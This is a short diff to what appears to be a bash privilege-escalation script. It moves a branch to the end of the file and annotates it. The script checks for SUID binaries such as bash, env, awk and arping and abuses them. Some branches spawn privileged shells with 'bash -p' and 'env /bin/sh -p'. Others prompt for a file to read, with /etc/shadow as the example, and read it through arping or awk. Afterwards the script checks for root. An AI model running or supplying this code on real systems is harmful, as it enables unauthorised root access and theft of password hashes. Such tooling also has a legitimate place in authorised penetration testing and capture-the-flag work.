@@ -59,11 +59,6 @@ else
 	elif grep "/usr/bin/bash" info.txt; then
 		cd /usr/bin
 		./bash -p
-	elif grep "/usr/bin/arp" info.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		cd /usr/bin
-		./arping -v -f "$LFILE"
 	elif grep "/usr/bin/awk" info.txt; then
 		read -p "What file would you like to view (ex: /etc/shadow):" answer
 		LFILE=$answer 
@@ -362,6 +357,12 @@ else
 	elif grep "/usr/bin/env" info.txt; then
 		cd /usr/bin
 		./env /bin/sh -p
+#KEEP ARP AT THE BOTTOM OF FILE
+	elif grep "/usr/bin/arp" info.txt; then
+		read -p "What file would you like to view (ex: /etc/shadow):" answer
+		LFILE=$answer
+		cd /usr/bin
+		./arping -v -f "$LFILE"
 	fi
 fi
 if [ "$(id -u)" = "0" ]; then
